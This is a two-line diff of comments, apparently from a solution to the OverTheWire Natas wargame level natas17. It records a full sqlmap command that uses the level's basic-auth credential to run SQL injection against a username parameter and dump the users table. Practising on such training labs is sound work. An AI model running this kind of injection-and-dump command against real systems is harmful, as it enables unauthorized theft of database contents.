@@ -1,0 +1,2 @@
+# i use sqlmap... It took me fucking 70 minutes to dump the whole database.
+# sqlmap --auth-type=basic --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw -u 'natas17.natas,labs.overthewire.org' --data="username=a" -p username --level=5 -D natas17 -T users --dump
